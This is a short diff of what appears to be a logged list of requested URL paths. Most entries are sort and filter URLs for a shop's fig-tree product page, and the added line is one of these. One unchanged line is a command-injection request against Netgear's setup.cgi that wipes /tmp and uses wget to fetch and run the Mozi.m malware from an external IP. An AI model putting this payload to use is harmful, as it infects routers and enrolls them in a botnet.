@@ -20359,3 +20359,4 @@ apiv4.9hits.com:443
 /figs-loso-gold-figs-30-50-cm?order=ASC&sort=rating&tag=30-
 /figs-loso-gold-figs-30-50-cm?order=ASC&sort=p.sort_order&tag=30-
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.210.101.211:52730/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/figs-loso-gold-figs-30-50-cm?order=DESC&sort=p.price&tag=50
